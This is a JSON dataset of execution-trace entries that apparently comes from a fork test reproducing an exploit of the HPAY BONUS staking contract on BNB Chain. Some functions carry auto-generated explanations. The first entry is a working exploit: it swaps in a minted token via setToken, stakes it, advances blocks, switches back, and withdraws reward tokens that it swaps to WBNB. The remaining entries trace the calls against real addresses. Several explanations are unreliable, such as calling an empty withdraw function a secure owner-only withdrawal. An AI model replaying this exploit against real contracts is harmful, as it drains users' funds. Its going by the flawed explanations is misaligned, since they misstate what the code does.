[
    {
        "id": "1851743",
        "args": "",
        "original_code": "    function testExploit() external {\n        emit log_named_decimal_uint(\n            \"[Start] Attacker WBNB balance before exploit\", WBNB_TOKEN.balanceOf(address(this)), 18\n        );\n\n        HPAY_TOKEN.approve(address(PS_ROUTER), type(uint256).max);\n        // Shitcoin token creation\n        SHITCOIN shitcoin = new SHITCOIN();\n        shitcoin.mint(100_000_000 * 1e18);\n\n        // Configuring shitcoin and staking it\n        BONUS.setToken(address(shitcoin));\n        shitcoin.approve(address(BONUS), type(uint256).max);\n        BONUS.stake(shitcoin.balanceOf(address(this)));\n\n        // Change block.number\n        vm.roll(block.number + 1000);\n\n        // Configure HPAY token back again\n        BONUS.setToken(address(HPAY_TOKEN));\n\n        // Withdraw reward token\n        BONUS.withdraw(30_000_000 * 1e18);\n        _HPAYToWBNB();\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker WBNB balance after exploit\", WBNB_TOKEN.balanceOf(address(this)), 18\n        );\n    }\n\n    /**\n",
        "description": "1. **Core functions**:  \n   The `testExploit` function is designed to simulate an attack scenario where an attacker manipulates a system to gain an unfair advantage. The function performs several steps:  \n   - It starts by logging the attacker's initial balance of WBNB (a token).  \n   - It approves a large amount of HPAY tokens for use by a router contract.  \n   - It creates a new token called SHITCOIN and mints a large amount of it.  \n   - It configures the system to use SHITCOIN for staking and stakes the entire balance of SHITCOIN.  \n   - It artificially advances the blockchain block number to simulate the passage of time.  \n   - It reconfigures the system to use HPAY tokens again.  \n   - It withdraws a large amount of rewards and converts them into WBNB.  \n   - Finally, it logs the attacker's WBNB balance after the exploit.  \n\n2. **Security mechanism**:  \n   The function does not include explicit security mechanisms to prevent misuse. Instead, it demonstrates potential vulnerabilities in a system:  \n   - It uses `approve` with `type(uint256).max`, which grants unlimited spending allowance, a risky practice.  \n   - It manipulates the blockchain's block number using `vm.roll`, which is a testing tool and not a real-world security measure.  \n   - There are no checks to ensure the legitimacy of the actions, making it exploitative in nature.  \n\n3. **Parameter Function**:  \n   The function does not take any parameters. All values and actions are hardcoded within the function, such as the amount of SHITCOIN minted, the block number increment, and the amount of rewards withdrawn.  \n\n4. **Return description**:  \n   The function does not return any value. Instead, it emits two log events:  \n   - The first log shows the attacker's WBNB balance before the exploit.  \n   - The second log shows the attacker's WBNB balance after the exploit.  \n   The difference between these two balances indicates the attacker's profit from the exploit.  \n\nIn summary, the `testExploit` function simulates an attack by manipulating token balances, staking, and block numbers to gain an unfair advantage. It highlights potential vulnerabilities in a system but lacks security mechanisms to prevent misuse.",
        "return_value": "Returned"
    },
    {
        "id": "2534",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
        "description": "1. Core functions:  \nThe `balanceOf` function is designed to check and return the balance of a specific account. It looks up the balance associated with the given account address and provides this information to the caller. This is a common function in token contracts to allow users or other contracts to query how many tokens a particular account holds.\n\n2. Security mechanism:  \nThe function uses the `public` and `view` modifiers. The `public` modifier allows the function to be called from outside the contract, while the `view` modifier ensures that the function does not modify the state of the contract, making it safe to call without incurring gas costs or altering any data. Additionally, the `virtual` and `override` keywords indicate that this function can be overridden by derived contracts, providing flexibility in extending its behavior.\n\n3. Parameter Function:  \nThe function takes one parameter, `account`, which is of type `address`. This parameter specifies the account whose token balance is being queried. The function uses this address to look up the corresponding balance in the `_balances` mapping.\n\n4. Return description:  \nThe function returns a `uint256` value, which represents the token balance of the specified account. It directly retrieves this value from the `_balances` mapping, which stores the balance of each account in the contract.\n\nIn summary,  \nThe `balanceOf` function is a simple and secure way to check the token balance of a specific account. It uses a mapping to store balances and ensures safety with modifiers that prevent state changes. The function takes an account address as input and returns the corresponding token balance.",
        "return_value": "0"
    },
    {
        "id": "25339",
        "args": "PS_ROUTER: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
        "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
        "description": "1. **Core function:**  \n   The `approve` function allows the caller (the owner of tokens) to give permission to another address (the `spender`) to spend a specific amount of tokens on their behalf. This is a common feature in token contracts to enable delegated spending.\n\n2. **Security mechanism:**  \n   - The function uses `public` visibility, meaning it can be called by anyone.  \n   - It includes the `virtual` and `override` keywords, indicating it can be customized or replaced in derived contracts.  \n   - The `_approve` internal function is called to handle the actual approval logic, which helps centralize and secure the approval process.  \n\n3. **Parameter Function:**  \n   - `spender`: The address that is being granted permission to spend tokens.  \n   - `amount`: The maximum number of tokens the spender is allowed to use.  \n\n4. **Return description:**  \n   The function always returns `true` to indicate that the approval was successful. The actual approval logic is handled by the internal `_approve` function.  \n\nIn summary, the `approve` function enables token owners to delegate spending rights to another address, ensuring controlled and secure token transfers.",
        "return_value": "true"
    },
    {
        "id": "736596",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "3341 bytes of code"
    },
    {
        "id": "47129",
        "args": "100000000000000000000000000 [1e26]",
        "original_code": "    function mint(address to, uint256 amount) public virtual {\n        require(hasRole(MINTER_ROLE, _msgSender()), \"ERC20PresetMinterPauser: must have minter role to mint\");\n        _mint(to, amount);\n    }\n\n",
        "description": "1. **Core functions:**  \n   The `mint` function is designed to create new tokens and assign them to a specific address. It ensures that only authorized users with the \"minter\" role can perform this action. This function is part of a token system where new tokens can be generated and distributed as needed.\n\n2. **Security mechanism:**  \n   The function uses a `require` statement to check if the caller has the `MINTER_ROLE`. If the caller does not have this role, the function will stop and return an error message. This ensures that only authorized users can mint tokens, preventing unauthorized token creation.\n\n3. **Parameter Function:**  \n   - `to`: This parameter specifies the address that will receive the newly minted tokens.  \n   - `amount`: This parameter defines the number of tokens to be created and assigned to the specified address.  \n\n4. **Return description:**  \n   The function does not return any value. Instead, it directly modifies the token balance of the `to` address by increasing it by the specified `amount`. This is done through the internal `_mint` function, which handles the actual token creation and assignment.\n\n**In summary,**  \nThe `mint` function allows authorized users to create new tokens and assign them to a specific address. It ensures security by verifying the caller's role before proceeding. The function takes two parameters: the recipient's address and the number of tokens to mint. It does not return a value but updates the recipient's token balance directly.",
        "return_value": "Returned"
    },
    {
        "id": "17660",
        "args": "SHITCOIN: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]",
        "original_code": "",
        "description": "",
        "return_value": "Returned"
    },
    {
        "id": "10487",
        "args": "SHITCOIN: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "25078",
        "args": "BONUS: [0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "824",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "100000000000000000000000000 [1e26]"
    },
    {
        "id": "208650",
        "args": "100000000000000000000000000 [1e26]",
        "original_code": "    function stake(uint256 _amount) internal override {\n        if(_amount == 0) {\n            return;\n        }\n        stakeAsset.safeIncreaseAllowance(address(stakeContract), _amount);\n        stakeContract.enterStaking(_amount);\n    }\n\n    function unstake(uint256 _amount) internal override {\n        stakeContract.leaveStaking(_amount);\n    }\n}\n",
        "description": "1. Core functions:\n   - The `stake` function is used to lock a specified amount of tokens into a staking contract. It first checks if the amount is zero, and if so, it does nothing. Otherwise, it increases the allowance for the staking contract to transfer the tokens and then calls the staking contract to lock the tokens.\n   - The `unstake` function is used to unlock a specified amount of tokens from the staking contract. It directly calls the staking contract to release the tokens.\n\n2. Security mechanism:\n   - The functions are marked as `internal`, meaning they can only be called from within the contract or derived contracts, which limits external access.\n   - The `safeIncreaseAllowance` method is used to safely increase the allowance for the staking contract, preventing potential issues with token transfers.\n   - The functions do not directly handle user funds but interact with a staking contract, which likely has its own security measures.\n\n3. Parameter Function:\n   - `_amount` in both functions represents the number of tokens to be staked or unstaked. It is a crucial parameter as it determines the quantity of tokens involved in the operation.\n\n4. Return description:\n   - Neither function returns a value. They perform actions (staking or unstaking tokens) but do not provide any output or result to the caller.\n\nIn summary, these functions manage the staking and unstaking of tokens by interacting with a staking contract. They include basic checks and security measures to ensure safe token transfers.",
        "return_value": "Returned"
    },
    {
        "id": "207956",
        "args": "100000000000000000000000000 [1e26]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "26533",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B, 2000000000000000000000000 [2e24]",
        "original_code": "    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n        unchecked {\n            _approve(sender, _msgSender(), currentAllowance - amount);\n        }\n\n        return true;\n    }\n\n",
        "description": "1. **Core functions:**  \n   The `transferFrom` function is designed to move a specified amount of tokens from one address (`sender`) to another (`recipient`). It is commonly used in scenarios where a third party (like a smart contract or another user) is authorized to transfer tokens on behalf of the `sender`. This function ensures that the transfer is valid and updates the remaining allowance after the transfer is completed.\n\n2. **Security mechanism:**  \n   - The function uses the `require` statement to check if the `sender` has granted sufficient allowance to the caller (`_msgSender()`) for the specified `amount`. If not, the transaction is reverted with an error message.  \n   - The `unchecked` block is used to safely reduce the allowance without worrying about overflow, as the `require` statement already ensures the `amount` is within the allowed limit.  \n   - The function is marked as `public` and `virtual`, allowing it to be overridden by derived contracts, and it also overrides a base function (`override`), ensuring compatibility with the ERC20 token standard.\n\n3. **Parameter Function:**  \n   - `sender`: The address from which tokens are being transferred.  \n   - `recipient`: The address receiving the tokens.  \n   - `amount`: The number of tokens to be transferred.  \n\n4. **Return description:**  \n   The function returns `true` to indicate that the transfer was successful. This is a standard practice in ERC20 token functions to confirm the operation\u2019s completion.  \n\n**In summary,**  \nThe `transferFrom` function allows a third party to transfer tokens on behalf of a `sender`, ensuring the transfer is within the allowed limit and updating the remaining allowance. It includes checks to prevent unauthorized transfers and returns `true` upon success.",
        "return_value": "true"
    },
    {
        "id": "26533",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], BONUS: [0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0], 98000000000000000000000000 [9.8e25]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "0",
        "args": "22281853 [2.228e7]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "1560",
        "args": "HPAY_TOKEN: [0xC75aa1Fa199EaC5adaBC832eA4522Cff6dFd521A]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "887",
        "args": "HPAY_TOKEN: [0xC75aa1Fa199EaC5adaBC832eA4522Cff6dFd521A]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "403580",
        "args": "30000000000000000000000000 [3e25]",
        "original_code": "    function withdraw(uint256 amount) override virtual public onlyOwner {}\n",
        "description": "1. Core functions:  \nThis function is designed to allow the owner of the contract to withdraw a specified amount of funds from the contract. It is a basic withdrawal mechanism that ensures only the owner can access the funds.\n\n2. Security mechanism:  \nThe function uses the `onlyOwner` modifier, which restricts access to the owner of the contract. This ensures that no one else can call this function and withdraw funds. Additionally, the function is marked as `virtual` and `override`, meaning it can be customized or extended in derived contracts while maintaining its core functionality.\n\n3. Parameter Function:  \nThe `amount` parameter specifies the quantity of funds the owner wishes to withdraw. It acts as the input value determining how much will be taken out of the contract.\n\n4. Return description:  \nThis function does not return any value. Its purpose is solely to execute the withdrawal of funds based on the provided `amount` parameter.\n\nIn summary, this function enables the contract owner to withdraw funds securely, ensuring only they can perform this action, while the `amount` parameter dictates the exact quantity to be withdrawn.",
        "return_value": "Returned"
    },
    {
        "id": "402907",
        "args": "30000000000000000000000000 [3e25]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "37274",
        "args": "BONUS: [0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0], 1000878647941797139237 [1e21]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "12413",
        "args": "BONUS: [0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0], 30404629833794213789798633 [3.04e25]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "5216",
        "args": "BONUS: [0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0], 30404629833794213789798633 [3.04e25]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "31049",
        "args": "0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B, 1000878647941797139237 [1e21]",
        "original_code": "    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n",
        "description": "1. **Core functions**:  \n   This function is designed to transfer a specified amount of tokens from the caller's address to another recipient's address. It acts as a bridge to initiate the transfer process by calling an internal `_transfer` function.\n\n2. **Security mechanism**:  \n   - The function uses the `public` modifier, making it accessible to anyone.  \n   - The `virtual` and `override` keywords indicate that this function can be customized or replaced by derived contracts, ensuring flexibility in inheritance.  \n   - The `_msgSender()` function is used to securely fetch the caller's address, preventing potential manipulation.  \n\n3. **Parameter Function**:  \n   - `recipient`: This is the address of the person or contract that will receive the tokens.  \n   - `amount`: This specifies the number of tokens to be transferred.  \n\n4. **Return description**:  \n   The function always returns `true` to confirm that the transfer process was initiated successfully. It does not directly handle the transfer logic but relies on the internal `_transfer` function to complete the operation.  \n\nIn summary, this function facilitates token transfers by securely passing the caller's address, recipient's address, and amount to an internal transfer mechanism, ensuring a straightforward and reliable process.",
        "return_value": "true"
    },
    {
        "id": "1913",
        "args": "BONUS: [0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0], 30405630712442155586937870 [3.04e25]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "1216",
        "args": "BONUS: [0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0], 30405630712442155586937870 [3.04e25]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "8305",
        "args": "0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B, 56163744873280578071739 [5.616e22]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "7608",
        "args": "0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B, 56163744873280578071739 [5.616e22]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "930",
        "args": "0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B",
        "original_code": null,
        "description": null,
        "return_value": "57164623521222375210976 [5.716e22]"
    },
    {
        "id": "17049",
        "args": "0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B, 600000000000000000000000 [6e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "1913",
        "args": "BONUS: [0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0], 30404629833794213789798633 [3.04e25]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "1216",
        "args": "BONUS: [0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0], 30404629833794213789798633 [3.04e25]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "4305",
        "args": "0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B, 57164623521222375210976 [5.716e22]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "3608",
        "args": "0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B, 57164623521222375210976 [5.716e22]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "930",
        "args": "0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B",
        "original_code": null,
        "description": null,
        "return_value": "657164623521222375210976 [6.571e23]"
    },
    {
        "id": "256392",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 29400000000000000000000000 [2.94e25]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "1913",
        "args": "BONUS: [0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0], 29804629833794213789798633 [2.98e25]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "1216",
        "args": "BONUS: [0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0], 29804629833794213789798633 [2.98e25]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "224548",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "223851",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "930",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "29400000000000000000000000 [2.94e25]"
    },
    {
        "id": "2633",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "0x0000000000000000000000000000000000000000000000088900bc094dadd899"
    },
    {
        "id": "930",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "29400000000000000000000000 [2.94e25]"
    },
    {
        "id": "319658",
        "args": "29400000000000000000000000 [2.94e25], 0, [0xC75aa1Fa199EaC5adaBC832eA4522Cff6dFd521A, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1666090831 [1.666e9]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "242337",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], WBNB_HPAY_PAIR: [0xa0A1E7571F938CC33daD497849F14A0c98B30FD0], 29400000000000000000000000 [2.94e25]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "17132",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 29400000000000000000000000 [2.94e25]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "16435",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 29400000000000000000000000 [2.94e25]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "930",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "633",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "0x0000000000000000000000000000000000000000000000088900bc094dadd899"
    },
    {
        "id": "3913",
        "args": "WBNB_HPAY_PAIR: [0xa0A1E7571F938CC33daD497849F14A0c98B30FD0], 38276009729219513316254676 [3.827e25]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "3216",
        "args": "WBNB_HPAY_PAIR: [0xa0A1E7571F938CC33daD497849F14A0c98B30FD0], 38276009729219513316254676 [3.827e25]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "162063",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "930",
        "args": "0xb1588cA2529fF4F1a8e21d6FE24bA6D0B6E000B0",
        "original_code": null,
        "description": null,
        "return_value": "1188774321402739570559930 [1.188e24]"
    },
    {
        "id": "930",
        "args": "0xb1588cA2529fF4F1a8e21d6FE24bA6D0B6E000B0",
        "original_code": null,
        "description": null,
        "return_value": "1188774321402739570559930 [1.188e24]"
    },
    {
        "id": "81739",
        "args": "0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B, 594387160701369785279965 [5.943e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "8372",
        "args": "0xb1588cA2529fF4F1a8e21d6FE24bA6D0B6E000B0, 1188774321402739570559930 [1.188e24]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "7675",
        "args": "0xb1588cA2529fF4F1a8e21d6FE24bA6D0B6E000B0, 1188774321402739570559930 [1.188e24]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "930",
        "args": "0xb1588cA2529fF4F1a8e21d6FE24bA6D0B6E000B0",
        "original_code": null,
        "description": null,
        "return_value": "594387160701369785279965 [5.943e23]"
    },
    {
        "id": "63336",
        "args": "0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B, 657164623521222375210976 [6.571e23]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "62639",
        "args": "0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B, 657164623521222375210976 [6.571e23]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "930",
        "args": "0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B",
        "original_code": null,
        "description": null,
        "return_value": "1251551784222592160490941 [1.251e24]"
    },
    {
        "id": "633",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "0x0000000000000000000000000000000000000000000000088900bc094dadd899"
    },
    {
        "id": "930",
        "args": "0xb1588cA2529fF4F1a8e21d6FE24bA6D0B6E000B0",
        "original_code": null,
        "description": null,
        "return_value": "594387160701369785279965 [5.943e23]"
    },
    {
        "id": "61016",
        "args": "0xc405c35ceC783C2ccc5430Dd13C2dbd18adCCd1c, 594387160701369785279965 [5.943e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "4372",
        "args": "0xb1588cA2529fF4F1a8e21d6FE24bA6D0B6E000B0, 594387160701369785279965 [5.943e23]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "3675",
        "args": "0xb1588cA2529fF4F1a8e21d6FE24bA6D0B6E000B0, 594387160701369785279965 [5.943e23]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "930",
        "args": "0xb1588cA2529fF4F1a8e21d6FE24bA6D0B6E000B0",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "43813",
        "args": "0xc405c35ceC783C2ccc5430Dd13C2dbd18adCCd1c, 1465349323423145263642183 [1.465e24]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "43116",
        "args": "0xc405c35ceC783C2ccc5430Dd13C2dbd18adCCd1c, 1465349323423145263642183 [1.465e24]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "930",
        "args": "0xc405c35ceC783C2ccc5430Dd13C2dbd18adCCd1c",
        "original_code": null,
        "description": null,
        "return_value": "2059736484124515048922148 [2.059e24]"
    },
    {
        "id": "633",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "0x0000000000000000000000000000000000000000000000088900bc094dadd899"
    },
    {
        "id": "534",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "2893",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "270011697890923210138 [2.7e20], 38276009729219513316254676 [3.827e25], 1666090427 [1.666e9]"
    },
    {
        "id": "930",
        "args": "WBNB_HPAY_PAIR: [0xa0A1E7571F938CC33daD497849F14A0c98B30FD0]",
        "original_code": null,
        "description": null,
        "return_value": "66500009729219513316254676 [6.65e25]"
    },
    {
        "id": "62738",
        "args": "114433555702427267533 [1.144e20], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "27962",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 114433555702427267533 [1.144e20]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "534",
        "args": "WBNB_HPAY_PAIR: [0xa0A1E7571F938CC33daD497849F14A0c98B30FD0]",
        "original_code": null,
        "description": null,
        "return_value": "155578142188495942605 [1.555e20]"
    },
    {
        "id": "930",
        "args": "WBNB_HPAY_PAIR: [0xa0A1E7571F938CC33daD497849F14A0c98B30FD0]",
        "original_code": null,
        "description": null,
        "return_value": "66500009729219513316254676 [6.65e25]"
    },
    {
        "id": "534",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "114433555702427267533 [1.144e20]"
    },
    {
        "id": "534",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "114433555702427267533 [1.144e20]"
    }
]